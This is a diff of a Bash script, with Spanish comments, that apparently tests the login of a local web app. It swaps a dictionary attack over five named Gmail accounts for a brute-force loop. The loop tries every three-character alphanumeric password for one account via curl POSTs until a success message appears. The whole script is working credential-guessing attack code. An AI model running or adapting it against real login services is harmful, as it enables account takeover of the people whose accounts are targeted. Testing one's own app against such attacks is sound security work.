@@ -1,36 +1,53 @@
 #!/bin/bash
 
 API="http://localhost:8000"
-echo "=== Probando seguridad del login ==="
+email="daniel.pro@gmail.com"
+caracteres="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+found=0
+password_encontrada=""
+intentos=0
+
+echo "****Ataque para contraseña****"
 
 
-passwords=(
-    "Marti_2024" "DaniPass09" "Val3ri@" "Andres98" "Cami*321"
-    "123456" "password" "admin" "test" "1234"
-)
-
-
-emails=("martina23@gmail.com" "daniel.pro@gmail.com" "valeria.dev@gmail.com" "andres1998@gmail.com" "camila.design@gmail.com")
-
-echo "Probando ${#emails[@]} usuarios con ${#passwords[@]} contraseñas..."
-echo ""
-
-for email in "${emails[@]}"; do
-    echo "Atacando: $email"
+probar_password() {
+    local pass="$1"
+    respuesta=$(curl -s -X POST "$API/login" \
+        -H "Content-Type: application/json" \
+        -d "{\"correo\":\"$email\", \"password\":\"$pass\"}")
     
-    for pass in "${passwords[@]}"; do
-        respuesta=$(curl -s -X POST "$API/login" \
-            -H "Content-Type: application/json" \
-            -d "{\"correo\":\"$email\", \"password\":\"$pass\"}")
-        
+    if echo "$respuesta" | grep -q "Login exitoso"; then
+        return 0
+    else
+        return 1
+    fi
+}
 
-        if echo "$respuesta" | grep -q "exitoso"; then
-            echo "✅ ENCONTRADO: $email - $pass"
-        else
-            echo "❌ Fallo: $pass"
-        fi
+
+for ((i=0; i<${#caracteres}; i++)); do
+    for ((j=0; j<${#caracteres}; j++)); do
+        for ((k=0; k<${#caracteres}; k++)); do
+            intento="${caracteres:$i:1}${caracteres:$j:1}${caracteres:$k:1}"
+            intentos=$((intentos+1))
+            echo -n "Intento #$intentos: $intento"
+            if probar_password "$intento"; then
+                echo " "
+                password_encontrada="$intento"
+                found=1
+                break 3
+            else
+                printf "\r\033[K"
+            fi
+        done
     done
-    echo "---"
 done
 
-echo "=== Prueba terminada ==="
+
+echo ""
+if [ $found -eq 1 ]; then
+    echo " CONTRASEÑA ENCONTRADA: $password_encontrada"
+else
+    echo " CONTRASEÑA NO ENCONTRADA"
+fi
+
+echo "****Prueba terminada****"
